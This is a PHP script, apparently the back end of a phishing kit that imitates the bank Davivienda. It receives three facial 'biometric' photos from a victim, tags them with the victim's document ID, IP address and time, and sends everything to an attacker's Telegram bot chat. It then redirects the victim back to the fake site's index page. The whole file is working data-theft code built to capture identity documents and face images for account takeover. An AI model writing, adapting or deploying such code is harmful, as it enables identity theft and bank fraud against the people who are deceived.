<?php
// 2.php - Versión con más información del dispositivo
session_start();
include 'bot.php';

// Verificar sesión
if (isset($_SESSION['username'])) {
    $username = $_SESSION['username'];
} else {
    die(json_encode(['success' => false, 'error' => 'No se ha definido el nombre de usuario en la sesión']));
}

// Verificar método
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die(json_encode(['success' => false, 'error' => 'Método de solicitud no permitido']));
}

// Verificar datos
if (!isset($_POST['foto1']) || !isset($_POST['foto2']) || !isset($_POST['foto3'])) {
    die(json_encode(['success' => false, 'error' => 'Faltan datos de las fotos']));
}

// Función para convertir base64 a archivo
function base64ToTempFile($base64Data, $prefix = 'foto_') {
    $imageData = preg_replace('/^data:image\/\w+;base64,/', '', $base64Data);
    $decodedImage = base64_decode($imageData);
    $tempFile = tempnam(sys_get_temp_dir(), $prefix);
    $tempFilePath = $tempFile . '.jpg';
    file_put_contents($tempFilePath, $decodedImage);
    return $tempFilePath;
}

// Función para enviar foto
function sendPhoto($botToken, $chatId, $photoPath, $caption) {
    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    $postFields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($photoPath)),
        'caption' => $caption
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ($httpCode === 200);
}

// Función para enviar mensaje
function sendMsg($botToken, $chatId, $text) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Datos del usuario
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');
$tempFiles = [];
$sent = 0;

// Mensaje inicial
$text = "D4V1V13ND4 | @sn0wdie\n----\n📸 B10M3TR14 F4C14L\n\nD0C: $username\nIP: $ip\nH0R4: $timestamp\n----";
sendMsg($botToken, $chatId, $text);

// Enviar fotos
for ($i = 1; $i <= 3; $i++) {
    $key = "foto$i";
    if (!empty($_POST[$key])) {
        $tempFile = base64ToTempFile($_POST[$key], "foto{$i}_");
        $tempFiles[] = $tempFile;
        
        $caption = "F0T0 $i/3\nD0C: $username\nIP: $ip";
        
        if (sendPhoto($botToken, $chatId, $tempFile, $caption)) {
            $sent++;
        }
        
        usleep(500000);
    }
}

// Limpiar archivos
foreach ($tempFiles as $file) {
    if (file_exists($file)) unlink($file);
}

// Mensaje final y redirección
$finalText = "----\n✅ 3NV14D4S: $sent/3\nD0C: $username\n3ST4D0: " . ($sent === 3 ? "C0MPL3T0" : "P4RC14L");
sendMsg($botToken, $chatId, $finalText);

if ($sent === 3) {
    header("Location: ../index.html");
    exit;
} else {
    echo "Error al enviar las fotos.";
}
?>
